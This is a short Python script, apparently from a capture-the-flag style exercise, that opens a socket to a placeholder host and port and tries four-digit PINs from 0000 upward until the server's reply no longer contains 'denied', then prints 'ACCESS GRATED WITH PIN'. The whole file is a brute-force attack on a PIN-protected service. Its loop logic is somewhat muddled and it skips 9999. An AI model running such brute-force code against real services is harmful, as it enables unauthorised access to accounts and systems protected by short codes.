import socket
from time import sleep

HOST = '<IP ADDRESS>'    # The remote host
PORT = <PORT>              # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((HOST, PORT))

while True:
    for i in range(0,9999):
        s.send(str(i).zfill(4).encode())
        data = s.recv(1024).decode()
        while "denied" not in data.lower():


            print(data)
            print(f"ACCESS GRATED WITH PIN {i}")
            s.close()
            break
    s.close()
